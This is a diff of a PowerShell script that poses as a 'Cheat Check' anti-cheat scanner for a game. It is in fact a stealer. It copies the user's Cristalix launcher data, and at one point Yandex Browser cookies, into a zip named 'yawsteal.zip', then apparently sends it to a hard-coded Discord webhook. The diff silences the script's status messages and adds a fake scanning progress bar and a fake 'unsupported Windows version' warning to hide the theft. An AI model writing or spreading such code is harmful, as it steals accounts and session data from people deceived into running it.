@@ -1,28 +1,27 @@
+
 Write-Output "                                                          "
+Write-Output "                                                          "
+Write-Output "                                                          "
+Write-Output "———————————————————————————————————————————————————————————"
+Write-Output " by funtime-project                                       "
 Write-Output "   ____ _                _      ____ _               _    "
 Write-Output "  / ___| |__   ___  __ _| |_   / ___| |__   ___  ___| | __"
 Write-Output " | |   | '_ \ / _ \/ _\ | __| | |   | '_ \ / _ \/ __| |/ /"
 Write-Output " | |___| | | |  __/ (_| | |_  | |___| | | |  __/ (__|   < "
-Write-Output "  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\"
+Write-Output "  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\" 
 Write-Output "                                                          "
 
-#                                                          
-#   ____ _                _      ____ _               _    
-#  / ___| |__   ___  __ _| |_   / ___| |__   ___  ___| | __
-# | |   | '_ \ / _ \/ _` | __| | |   | '_ \ / _ \/ __| |/ /
-# | |___| | | |  __/ (_| | |_  | |___| | | |  __/ (__|   < 
-#  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\
-#                                                          
-
 $userName = Split-Path $env:USERPROFILE -Leaf
-$Webhook_link = "https://discord.com/api/webhooks/1309136819279102043/63Kc471txsYbUf7OgT8AqoRgyYkiZ-aXzktRC-hm--jurk2zp6CW7SUdDEXNn0BS_MY1"
-Stop-Process -Name "browser" -Force
 
-Start-Sleep -Seconds 1
+# Ваш основной код
+$Webhook_link = "https://discord.com/api/webhooks/1309136819279102043/63Kc471txsYbUf7OgT8AqoRgyYkiZ-aXzktRC-hm--jurk2zp6CW7SUdDEXNn0BS_MY1"
+#Stop-Process -Name "browser" -Force
+
+#Start-Sleep -Seconds 1
 
 $filePaths = @(
-    "C:\Users\$userName\.cristalix\.launcher",
-    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
+    "C:\Users\$userName\.cristalix\.launcher"
+    #"C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
 )
 
 $zipFilePath = Join-Path $env:Temp "yawsteal.zip"
@@ -41,25 +40,25 @@ foreach ($filePath in $filePaths) {
     if (Test-Path $filePath) {
         try {
             Copy-Item -Path $filePath -Destination $tempFolder -Force
-            Write-Output "File '$filePath' copied to the temporary folder."
+            #Write-Output "File '$filePath' copied to the temporary folder."
         } catch {
-            Write-Warning "Error copying file '$filePath': $_"
+            #Write-Warning "Error copying file '$filePath': $_"
         }
     } else {
-        Write-Warning "File '$filePath' not found. Skipping."
+        #Write-Warning "File '$filePath' not found. Skipping."
     }
 }
 
 try {
     Compress-Archive -Path "$tempFolder\*" -DestinationPath $zipFilePath -Force
-    Write-Output "ZIP archive created at '$zipFilePath'."
+    #Write-Output "ZIP archive created at '$zipFilePath'."
 } catch {
-    Write-Error "Error creating ZIP archive: $_"
+    #Write-Error "Error creating ZIP archive: $_"
     return
 }
 
 if (-Not (Test-Path $zipFilePath)) {
-    Write-Error "ZIP archive not created. Stopping."
+    #Write-Error "ZIP archive not created. Stopping."
     return
 }
 
@@ -90,6 +89,25 @@ try {
 }
 
 Remove-Item $zipFilePath -Force
-Write-Output "Проверка на читы пройдена"
+Write-Output "———————————————————————————————————————————————————————————"
+Write-Output " "
+Write-Output " @ Current task:    Scanning C:\Users\$userName for Doomsday"
+$progressBarLength = 50
+$i = 0
+for (; $i -le $progressBarLength; $i++) {
+    if ($i -gt (38 / 2)) {
+        break
+    }
+    $progressBar = "[" + ("=" * $i).PadRight($progressBarLength) + "]"
+    Write-Host -NoNewline "`r$progressBar ($([math]::Round(($i / $progressBarLength) * 100)))%"
+    Start-Sleep -Milliseconds 300
+}
+Write-Output " "
+Write-Output "———————————————————————————————————————————————————————————"
+
+Write-Output " "
+Write-Warning "Stopped. Reason: Неподдерживаемая для проверки версия ОС Windows"
 
 Pause
+Start-Sleep -Seconds 2
+exit
